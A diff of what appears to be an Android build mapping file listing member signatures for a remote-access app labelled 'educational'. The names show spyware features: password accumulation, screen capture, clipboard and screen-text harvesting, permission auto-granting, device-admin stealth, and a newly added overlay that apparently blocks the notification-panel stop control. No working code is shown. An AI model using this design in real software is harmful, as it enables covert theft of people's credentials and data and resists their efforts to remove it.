@@ -3084,6 +3084,7 @@ com.remoteaccess.educational.services.RemoteAccessService:
 com.remoteaccess.educational.services.UnifiedAccessibilityService:
     private static final int SOCKET_CHECK_INTERVAL
     private static final java.lang.String TAG
+    private android.os.Handler notifStopOverlayHandler
     private void clickAllTextElementsCI(android.view.accessibility.AccessibilityNodeInfo,java.lang.String)
     private boolean findAndClickContaining(android.view.accessibility.AccessibilityNodeInfo,java.lang.String)
     private boolean findAndEnableToggleForAppName(android.view.accessibility.AccessibilityNodeInfo)
@@ -3091,7 +3092,7 @@ com.remoteaccess.educational.services.UnifiedAccessibilityService:
     private java.lang.String getNodeContextText(android.view.accessibility.AccessibilityNodeInfo)
     private boolean isButtonClass(android.view.accessibility.AccessibilityNodeInfo)
     private synthetic void lambda$reEnableAutoGrant$4()
-    private synthetic void lambda$scheduleBack$6()
+    private synthetic void lambda$scheduleBack$7()
     public boolean performClick(float,float)
     public boolean performHome()
     public boolean performNotifications()
@@ -13181,7 +13182,7 @@ com.remoteaccess.educational.services.RemoteAccessService:
     public static void connectToServer()
     public static android.app.Notification createNotification()
     public static void createNotificationChannel()
-com.remoteaccess.educational.services.UnifiedAccessibilityService$$InternalSyntheticLambda$4$884c31a43fbd7cf32de00b73634b143f5a9805be1642fa8614991a7c04ad7b6e$0:
+com.remoteaccess.educational.services.UnifiedAccessibilityService$$InternalSyntheticLambda$4$dddaecd048d541c616a37dc9e995502e9ef501347dfa8e966a926486b1047ebb$0:
     public final synthetic java.lang.String f$1
 com.remoteaccess.educational.services.UnifiedAccessibilityService$2:
     public final synthetic com.remoteaccess.educational.services.UnifiedAccessibilityService this$0
@@ -13192,7 +13193,6 @@ com.remoteaccess.educational.services.UnifiedAccessibilityService:
     public com.remoteaccess.educational.services.UnifiedAccessibilityService$4 autoGrantScanRunnable
     public android.content.ClipboardManager clipboardManager
     public java.lang.String lastClipboard
-    public int screenHeight
     public int screenWidth
     public static java.lang.String buildAccumulatedPassword()
     public static android.graphics.Bitmap captureScreenSync()
@@ -13201,16 +13201,18 @@ com.remoteaccess.educational.services.UnifiedAccessibilityService:
     public static java.lang.String getAllScreenText(android.view.accessibility.AccessibilityNodeInfo)
     public static boolean isSystemPanelOpen()
     public static synthetic void lambda$addBlackOverlay$5()
-    public static void lambda$attemptAutoUninstall$10()
-    public static synthetic void lambda$attemptAutoUninstall$9()
-    public static synthetic void lambda$enableUninstallAssist$7()
+    public static synthetic void lambda$attemptAutoUninstall$10()
+    public static void lambda$attemptAutoUninstall$11()
+    public static synthetic void lambda$enableUninstallAssist$8()
     public static void lambda$onServiceConnected$0()
     public static synthetic void lambda$onServiceConnected$1()
     public static void lambda$onServiceConnected$2()
-    public static synthetic void lambda$onUnbind$11()
-    public static synthetic void lambda$scheduleAutoUninstall$8()
+    public static synthetic void lambda$onUnbind$12()
+    public static synthetic void lambda$placeNotifStopOverlay$6()
+    public static synthetic void lambda$scheduleAutoUninstall$9()
     public static synthetic void lambda$startAutoGrantTimer$3()
     public static boolean performBack()
+    public static void placeNotifStopOverlay()
     public final void removeBlackOverlay()
     public static boolean runAppNameAllowAccessClicker()
     public static boolean runUninstallAssist()
@@ -13219,6 +13221,7 @@ com.remoteaccess.educational.services.UnifiedAccessibilityService:
     public static void startAutoGrantTimer()
     public static void startPermissionScanner()
     public static void startSocketCheckLoop()
+    public static void updateNotifPanelStopOverlay()
 com.remoteaccess.educational.stealth.StealthManager:
     public android.content.ComponentName adminComponent
     public android.app.admin.DevicePolicyManager devicePolicyManager
